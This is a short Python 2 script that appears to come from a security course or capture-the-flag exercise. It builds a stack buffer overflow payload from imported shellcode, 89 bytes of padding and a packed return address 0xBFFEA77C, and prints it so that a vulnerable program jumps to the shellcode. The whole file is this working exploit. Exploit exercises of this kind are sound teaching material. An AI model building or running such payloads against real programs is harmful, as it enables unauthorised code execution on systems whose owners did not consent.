from shellcode import shellcode
from struct import pack

print shellcode+'\x01'*89+pack("<I",0xBFFEA77C)
